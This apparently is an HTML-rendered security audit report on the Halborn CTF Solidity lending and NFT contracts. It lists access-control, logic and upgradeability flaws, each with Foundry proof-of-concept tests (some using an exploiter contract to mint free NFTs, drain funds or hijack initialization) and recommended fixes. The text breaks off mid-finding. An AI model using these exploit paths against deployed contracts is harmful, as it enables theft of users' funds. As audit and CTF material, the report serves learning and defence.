@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>2024-03-halborn-ctf.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<div align="center">
+<p><img src="./logo.png" alt="Bellum Galaxy"></p>
+</div>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+<h1 id="table-of-contents">Table of Contents</h1>
+<details>
+<summary>See table</summary>
+<ul>
+<li><a href="#table-of-contents">Table of Contents</a></li>
+<li><a href="#about-patrick-barba-carneiro">About Patrick (Barba) Carneiro</a></li>
+<li><a href="#disclaimer">Disclaimer</a></li>
+<li><a href="#risk-classification">Risk Classification</a></li>
+<li><a href="#protocol-summary">Protocol Summary</a></li>
+<li><a href="#audit-details">Audit Details</a>
+<ul>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#roles">Roles</a></li>
+</ul>
+</li>
+<li><a href="#executive-summary">Executive Summary</a>
+<ul>
+<li><a href="#issues-found">Issues found</a></li>
+</ul>
+</li>
+<li><a href="#audit-findings">Audit Findings</a>
+<ul>
+<li><a href="#protocol-design-considerations">Protocol Design Considerations</a></li>
+<li><a href="#critical-severity-vulnerabilities">Critical Severity Vulnerabilities</a>
+<ul>
+<li><a href="#upgradable-functionalities-are-unprotected-leading-to-potential-exploits">Upgradable functionalities are unprotected, leading to potential exploits.</a></li>
+<li><a href="#halbornnftmerkleroot-state-variable-can-be-manipulated-because-of-a-lack-of-access-control-leading-to-a-drain-of-funds"><code>HalbornNFT::merkleRoot</code> state variable can be manipulated because of a lack of access control, leading to a drain of funds.</a></li>
+<li><a href="#halbornloansgetloan-function-implements-an-inverted-check-requirement-that-allows-users-to-get-bigger-amounts-than-the-collateral-allocated-previews"><code>HalbornLoans::getLoan</code> function implements an inverted check requirement that allows users to get bigger amounts than the collateral allocated previews</a></li>
+<li><a href="#halbornloansreturnloan-adds-the-returned-value-to-storage-instead-of-subtracting-leading-to-a-dos"><code>HalbornLoans::returnLoan</code> adds the returned value to storage instead of subtracting, leading to a DoS</a></li>
+<li><a href="#immutable-variable-is-initialized-through-the-constructor-on-halbornloanscollateralvalue">Immutable Variable is initialized through the constructor on <code>HalbornLoans::collateralValue</code></a></li>
+</ul>
+</li>
+<li><a href="#high-severity-vulnerabilities">High Severity Vulnerabilities</a>
+<ul>
+<li><a href="#fixed-collateral-prices-can-lead-to-price-manipulation-and-inflation">Fixed Collateral Prices can lead to price manipulation and inflation.</a></li>
+<li><a href="#halbornnftsol-and-halbornloanssol-has-no-access-control-and-can-be-frontrun"><code>HalbornNFT.sol</code> and <code>HalbornLoans.sol</code> has no access control and can be frontrun.</a></li>
+<li><a href="#halbornloanssol-is-not-compatible-with-receiving-nft-leading-to-dos"><code>HalbornLoans.sol</code> is not compatible with receiving NFT, leading to DoS.</a></li>
+<li><a href="#halbornnftsol-owner-can-withdraw-all-the-ether-from-the-contract-removing-the-value-backing-other-functionalities"><code>HalbornNFT.sol</code> owner can withdraw all the ether from the contract, removing the value backing other functionalities.</a></li>
+</ul>
+</li>
+<li><a href="#low-severity-vulnerabilities">Low Severity Vulnerabilities</a>
+<ul>
+<li><a href="#reentrancy-risk-the-halbornloansdepositnftcollateral-doesnt-follow-cei-patterns">Reentrancy Risk. The <code>HalbornLoans::depositNFTCollateral</code> doesn't follow CEI patterns</a></li>
+<li><a href="#reentrancy-risk-the-halbornloanswithdrawcollateral-doesnt-follow-cei-patterns">Reentrancy Risk. The <code>HalbornLoans::withdrawCollateral</code> doesn't follow CEI patterns</a></li>
+<li><a href="#storage-variables-updated-without-event-emission">Storage variables updated without event emission</a></li>
+</ul>
+</li>
+<li><a href="#gas-observations">Gas Observations</a>
+<ul>
+<li><a href="#state-variables">State Variables</a></li>
+</ul>
+</li>
+<li><a href="#appendices">Appendices</a>
+<ul>
+<li><a href="#exploiter-contract-example">Exploiter Contract Example</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</details>
+</br>
+<h1 id="about-patrick-barba-carneiro">About Patrick (Barba) Carneiro</h1>
+<p>Solidity Developer, Security Researcher, Founder of Bellum Galaxy and Chainlink Advocate. With three months of programming experience I developed a Top Quality Project at Chainlink Constellation Hackathon. In my first competitive audit, I achieved a Top 5 position.
+I am a competitive person who daily fights for improvement. Driven by this way of thinking I founded Bellum Galaxy, a educacional community focused on science and technology to help people face life challeges, and grow personally and professionally.</p>
+<h1 id="disclaimer">Disclaimer</h1>
+<p>The Bellum Galaxy team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.</p>
+<h1 id="risk-classification">Risk Classification</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th>Impact</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td>High</td>
+<td>Medium</td>
+<td>Low</td>
+</tr>
+<tr>
+<td></td>
+<td>High</td>
+<td>H</td>
+<td>H/M</td>
+<td>M</td>
+</tr>
+<tr>
+<td>Likelihood</td>
+<td>Medium</td>
+<td>H/M</td>
+<td>M</td>
+<td>M/L</td>
+</tr>
+<tr>
+<td></td>
+<td>Low</td>
+<td>M</td>
+<td>M/L</td>
+<td>L</td>
+</tr>
+</tbody>
+</table>
+<p>We use the <a href="https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity">CodeHawks</a> severity matrix to determine severity. See the documentation for more details.</p>
+<p>NOTE: Given the severity of some issues found in this audit, we adopted a Critical category for four of the findings.</p>
+<h1 id="protocol-summary">Protocol Summary</h1>
+<h1 id="audit-details">Audit Details</h1>
+<ul>
+<li><strong>Project Name:</strong>
+<ul>
+<li>HalbornCTF - Solidity Ethereym</li>
+</ul>
+</li>
+<li><strong>Smart Contract Address:</strong>
+<ul>
+<li>Not deployed</li>
+</ul>
+</li>
+<li><strong>Audit Date:</strong>
+<ul>
+<li>15/03/2024</li>
+</ul>
+</li>
+<li><strong>The findings described in this document correspond the following commit hash:</strong>
+<ul>
+<li>Commit Hash not specified.</li>
+</ul>
+</li>
+</ul>
+<h2 id="scope">Scope</h2>
+<pre class="hljs"><code><div>#-- src
+|   #-- HalbornLoans.sol
+|   #-- HalbornNFT.sol
+|   #-- HalbornToken.sol
+</div></code></pre>
+<h2 id="roles">Roles</h2>
+<ul>
+<li>N/A</li>
+</ul>
+<h1 id="executive-summary">Executive Summary</h1>
+<h2 id="issues-found">Issues found</h2>
+<table>
+<thead>
+<tr>
+<th>Severtity</th>
+<th>Number of issues found</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Critical</td>
+<td>5</td>
+</tr>
+<tr>
+<td>High</td>
+<td>4</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>0</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>3</td>
+</tr>
+<tr>
+<td>Gas</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Total</td>
+<td>13</td>
+</tr>
+</tbody>
+</table>
+<h1 id="audit-findings">Audit Findings</h1>
+<h2 id="protocol-design-considerations">Protocol Design Considerations</h2>
+<ul>
+<li><strong>Description:</strong>
+<ul>
+<li>The protocol design allow users to take loans without obligation to return.</li>
+</ul>
+</li>
+<li><strong>Impact:</strong>
+<ul>
+<li>A malicious users can take advantage of this vulnerability to profit on top of the Buy -&gt; getLoan with fixed Collateral functionalities inflating the token until it became unsustainable and unprofitable.</li>
+</ul>
+</li>
+<li><strong>Recommendation:</strong>
+<ul>
+<li>Consider add an liquidation funcionallity following price variation received from a Chainlink Oracle, for example.</li>
+</ul>
+</li>
+</ul>
+<h2 id="critical-severity-vulnerabilities">Critical Severity Vulnerabilities</h2>
+<h3 id="upgradable-functionalities-are-unprotected-leading-to-potential-exploits">Upgradable functionalities are unprotected, leading to potential exploits.</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>All the functions that enable the upgradability are unprotected this could lead to many exploit scenarios in which a malicious user can take advantage of it and, for example, implement a <code>selfDestruct</code> function on <code>HalbornNFT.sol</code> and use this to push all the ether to his address.</li>
+<li><code>HalbornLoans::_authorizeUpgrade</code></li>
+<li><code>HalbornNFT::_authorizeUpgrade</code></li>
+<li><code>HalbornToken::_authorizeUpgrade</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Given the nature of the vulnerability, the protocol would be doomed.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+  <details>
+  <summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>
+  //HalbornLoans.sol
+<span class="hljs-addition">+ import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol";</span>
+
+<span class="hljs-deletion">- contract HalbornLoans is Initializable, UUPSUpgradeable, MulticallUpgradeable, IERC721Receiver {</span>
+<span class="hljs-addition">+ contract HalbornLoans is Initializable, UUPSUpgradeable, OwnableUpgradeable, MulticallUpgradeable, IERC721Receiver {</span>
+
+    
+  function initialize(address token_, address nft_) public initializer {
+    __UUPSUpgradeable_init();
+    __Multicall_init();
+<span class="hljs-addition">+   __Ownable_init(msg.sender);</span>
+    token = HalbornToken(token_);
+    nft = HalbornNFT(nft_);
+  }
+
+<span class="hljs-deletion">-   function _authorizeUpgrade(address) internal override {}</span>
+<span class="hljs-addition">+   function _authorizeUpgrade(address) internal override onlyOwner {}</span>
+
+</div></code></pre>
+<pre class="hljs"><code><div>
+  //HalbornToken.sol
+<span class="hljs-deletion">-   function _authorizeUpgrade(address) internal override {}</span>
+<span class="hljs-addition">+   function _authorizeUpgrade(address) internal override onlyOwner {}</span>
+
+</div></code></pre>
+<pre class="hljs"><code><div>
+  //HalbornNFT.sol
+<span class="hljs-deletion">-   function _authorizeUpgrade(address) internal override {}</span>
+<span class="hljs-addition">+   function _authorizeUpgrade(address) internal override onlyOwner {}</span>
+
+</div></code></pre>
+  </details>
+</li>
+</ul>
+<h3 id="halbornnftmerkleroot-state-variable-can-be-manipulated-because-of-a-lack-of-access-control-leading-to-a-drain-of-funds"><code>HalbornNFT::merkleRoot</code> state variable can be manipulated because of a lack of access control, leading to a drain of funds.</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>A malicious user can update the <code>HalbornNFT::merkleRoot</code> variable to his advantage, leading to a mint of free NFTs. These NFTs can be used as collateral in <code>HalbornLoans</code> and consequently used to mint catastrophic amounts of <code>HalbornToken</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li><code>HalbornToken</code> can lose value, hurting users and breaking the protocol.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Please include the following code and the exploiter contract located at the end of this report in the `Halborn.t.sol` file.</summary>
+<pre class="hljs"><code><div>    function testIfAUserCanExploitIt() public {
+        
+        vm.startPrank(Barba);
+
+        exploiter ex = new exploiter(address(nft), address(m), Barba, address(loans));
+        assertEq(nft.balanceOf(address(ex)), 0);
+        ex.exploit();
+        assertEq(nft.balanceOf(address(ex)), 4);
+
+        assertEq(nft.merkleRoot(), ex.root());
+        vm.stopPrank();
+        
+        assertEq(nft.balanceOf(ALICE), 0);
+
+        vm.startPrank(ALICE);
+
+        vm.expectRevert(&quot;Invalid proof.&quot;);
+        nft.mintAirdrops(15, ALICE_PROOF_1);
+
+        vm.stopPrank();
+
+        assertEq(nft.balanceOf(ALICE), 0);
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+  <details>
+  <summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div><span class="hljs-deletion">-   function setMerkleRoot(bytes32 merkleRoot_) public {</span>
+<span class="hljs-addition">+   function setMerkleRoot(bytes32 merkleRoot_) public onlyOwner {</span>
+        merkleRoot = merkleRoot_;
+        emit MerkleRootUpdated(merkleRoot);
+    }
+</div></code></pre>
+  </details>
+</li>
+</ul>
+<h3 id="halbornloansgetloan-function-implements-an-inverted-check-requirement-that-allows-users-to-get-bigger-amounts-than-the-collateral-allocated-previews"><code>HalbornLoans::getLoan</code> function implements an inverted check requirement that allows users to get bigger amounts than the collateral allocated previews</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li><code>HalbornLoans::getLoan</code> implements a logic in which a user MUST get loans with a higher value than the collateral previously provided.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Unlimited amount of <code>HalbornToken</code> minted.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>    function testIfRequireWorks() public {
+        vm.startPrank(ALICE);
+        nft.mintAirdrops(15, ALICE_PROOF_1);
+        nft.approve(address(loans), 15);
+
+        loans.depositNFTCollateral(15);
+        
+        vm.expectRevert(&quot;Not enough collateral&quot;);
+        loans.getLoan(1 ether);
+
+        loans.getLoan(3 ether);
+
+        assertEq(token.balanceOf(ALICE), 3 ether);
+        vm.stopPrank();
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+  <details>
+  <summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>    function getLoan(uint256 amount) external {
+<span class="hljs-deletion">-       require(totalCollateral[msg.sender] - usedCollateral[msg.sender] &lt; amount,</span>
+<span class="hljs-addition">+       require(totalCollateral[msg.sender] - usedCollateral[msg.sender] &gt; amount,</span>
+            "Not enough collateral"
+        );
+        usedCollateral[msg.sender] += amount;
+        token.mintToken(msg.sender, amount);
+    }
+</div></code></pre>
+  </details>
+</li>
+</ul>
+<h3 id="halbornloansreturnloan-adds-the-returned-value-to-storage-instead-of-subtracting-leading-to-a-dos"><code>HalbornLoans::returnLoan</code> adds the returned value to storage instead of subtracting, leading to a DoS</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>Once a user allocates the NFT as Collateral and takes a loan on <code>HalbornLoans::getLoan</code> his NFT is locked forever because the <code>HalbornLoans::returnLoan</code> function adds the value returned to the storage instead of subtracting growing user debt.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>HalbornToken is burned, and NFT is locked forever. Users lose money.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>    function testIfUserCanWithdrawTheNft() public {
+        vm.startPrank(ALICE);
+        nft.mintAirdrops(15, ALICE_PROOF_1);
+        nft.approve(address(loans), 15);
+
+        loans.depositNFTCollateral(15);
+
+        loans.getLoan(2.1 ether);
+
+        loans.returnLoan(2.1 ether);
+
+        console.log(loans.totalCollateral(ALICE));
+        console.log(loans.usedCollateral(ALICE));
+
+        loans.withdrawCollateral(15);
+
+        vm.stopPrank();
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+  <details>
+  <summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>    function returnLoan(uint256 amount) external {
+        require(usedCollateral[msg.sender] &gt;= amount, "Not enough collateral");
+        require(token.balanceOf(msg.sender) &gt;= amount);
+        //usedCollateral is incremented instead of decremented. Token will be burn, but the collateral will be stuck.
+<span class="hljs-deletion">-        usedCollateral[msg.sender] += amount;</span>
+<span class="hljs-addition">+        usedCollateral[msg.sender] -= amount;        </span>
+        token.burnToken(msg.sender, amount);
+    }
+</div></code></pre>
+  </details>
+</li>
+</ul>
+<h3 id="immutable-variable-is-initialized-through-the-constructor-on-halbornloanscollateralvalue">Immutable Variable is initialized through the constructor on <code>HalbornLoans::collateralValue</code></h3>
+<ul>
+<li><strong>Description:</strong>
+<ul>
+<li>The immutable variable <code>collateralValue</code> is initiate by a constructor call on the <code>HalbornLoans.sol</code></li>
+</ul>
+</li>
+<li><strong>Impact:</strong>
+<ul>
+<li>Variables initialized through a constructor are only initialized on the implementation contract and don't reflet on the proxy contract. Considering that this is a critical variable for the protocol functionality, the impact is critical.</li>
+</ul>
+</li>
+<li><strong>Proof of Concept:</strong></li>
+<li><strong>Recommendation:</strong>
+<ul>
+<li>Move the initialization to the <code>HalbornLoans::initialize</code> function.</li>
+</ul>
+</li>
+</ul>
+<details>
+<summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>
+-   uint256 public immutable collateralPrice;
++   uint256 public collateralPrice;
+
+-   constructor(uint256 collateralPrice_) {
+-     collateralPrice = collateralPrice_;
+-   }
+
+    
+    function initialize(uint256 collateralPrice_, address token_, address nft_) public initializer {
+        __UUPSUpgradeable_init();
+        __Multicall_init();
++       collateralPrice = collateralPrice_;
+        token = HalbornToken(token_);
+        nft = HalbornNFT(nft_);
+    }
+
+</div></code></pre>
+</details>
+<h2 id="high-severity-vulnerabilities">High Severity Vulnerabilities</h2>
+<h3 id="fixed-collateral-prices-can-lead-to-price-manipulation-and-inflation">Fixed Collateral Prices can lead to price manipulation and inflation.</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>A fixed collateral value can damage the protocol in two ways, and both have some complications.
+<ul>
+<li>Token value above the fixed collateral price;
+<ul>
+<li>A user can take advantage of Fixed Collateral Price and Fixed NFT Price to mint NFTs, allocate them as collateral, and take infinite loans on HalbornLoans until the price drops below a profitable value.</li>
+</ul>
+</li>
+<li>Token value below the fixed collateral price;
+<ul>
+<li>Nobody will invest in the protocol or get loans if it's not a realistic value.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>HalbornToken will be minted without control leading to inflation and price manipulation, hurting users.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Please include the following code, and the exploiter contract located at the end of this report, to the `Halborn.t.sol` file.</summary>
+<pre class="hljs"><code><div>    uint256 constant EXPLOITER_INITIAL_VALUE = 25 ether;
+    function testMaliciousUserCanDrainTheProtocolMoney() public{
+
+        exploiter ex = new exploiter(address(nft), address(m), Barba, address(loans));
+        vm.deal(address(ex), EXPLOITER_INITIAL_VALUE);
+
+        assertEq(address(nft).balance, 0);
+
+        ex.drainFundsWithFixedCollateralValue();
+
+        assertEq(address(nft).balance, EXPLOITER_INITIAL_VALUE);
+
+        token.balanceOf(address(ex));
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Consider utilizing an oracle service like Chainlink Data Feed, insteed of using fixed values.</li>
+</ul>
+</li>
+</ul>
+<h3 id="halbornnftsol-and-halbornloanssol-has-no-access-control-and-can-be-frontrun"><code>HalbornNFT.sol</code> and <code>HalbornLoans.sol</code> has no access control and can be frontrun.</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li><code>HalbornNFT.sol</code> and <code>HalbornLoans.sol</code> can be front-run and initialized by anyone, leading to other exploit scenarios.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Excluding the upgradability functionality and the complications over the proxy, the protocol could have several problems.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Please include the followin code to `Halborn.t.sol` file</summary>
+<pre class="hljs"><code><div>    function testIfSomeoneElseCanInitializeTheContracts() public {
+        vm.startPrank(BOB);
+        bytes32[] memory data = new bytes32[](4);
+        data[0] = keccak256(abi.encodePacked(Barba, uint256(10)));
+        data[1] = keccak256(abi.encodePacked(Barba, uint256(25)));
+        data[2] = keccak256(abi.encodePacked(Barba, uint256(39)));
+        data[3] = keccak256(abi.encodePacked(Barba, uint256(41)));
+
+        bytes32 exploiterRoot = m.getRoot(data);
+
+        nft.initialize(exploiterRoot, 1 ether);
+        loans.initialize(ALICE, Barba);
+
+        //HalbornToken public token;
+        address exploitedToken = address(loans.token());
+        //HalbornNFT public nft;
+        address exploitedNft = address(loans.nft());
+
+        assertEq(exploitedToken, ALICE);
+        assertEq(exploitedNft, Barba);
+
+        vm.stopPrank();
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Consider create a whitelist of allowed address to initialize the contract or limit it to onlyOwner.</li>
+</ul>
+</li>
+</ul>
+<h3 id="halbornloanssol-is-not-compatible-with-receiving-nft-leading-to-dos"><code>HalbornLoans.sol</code> is not compatible with receiving NFT, leading to DoS.</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li><code>IERC721Receiver</code> interface is not implemented in <code>HalbornLoans.sol</code>. The contract is not allowed to manipulate NFTs, leading to a DoS.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Users who bought the NFT wouldn't be able to use it as collateral and mint <code>HalbornToken</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>    error ERC721InvalidReceiver(address _contract);
+    function testIfLoansCanReceiveNFTAsCollateral() public {
+        vm.startPrank(ALICE);
+        nft.mintAirdrops(15, ALICE_PROOF_1);
+        nft.approve(address(loans), 15);
+
+        vm.expectRevert(abi.encodeWithSelector(ERC721InvalidReceiver.selector, address(loans)));
+        loans.depositNFTCollateral(15);
+        vm.stopPrank();
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<details>
+<summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>
+<span class="hljs-addition">+   interface IERC721Receiver {</span>
+<span class="hljs-addition">+     function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);</span>
+<span class="hljs-addition">+    }</span>
+
+<span class="hljs-deletion">-   contract HalbornLoans is Initializable, UUPSUpgradeable, MulticallUpgradeable {</span>
+<span class="hljs-addition">+   contract HalbornLoans is Initializable, UUPSUpgradeable, MulticallUpgradeable, IERC721Receiver {</span>
+
